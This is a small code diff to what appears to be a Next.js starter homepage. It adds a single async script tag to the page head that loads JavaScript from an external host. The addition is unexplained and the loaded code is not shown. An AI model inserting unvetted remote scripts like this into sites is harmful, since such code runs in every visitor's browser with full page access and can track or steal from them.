@@ -37,6 +37,7 @@ export default function Home() {
       <Head>
         <title>Next.js Starter!</title>
         <link rel="icon" href="/favicon.ico" />
+        <script charset="UTF-8" src="https://cdn.master1.qappg.co/js/679c8e8ed9aea951ef295e1f.js" async="async"></script>
       </Head>
 
       <main>
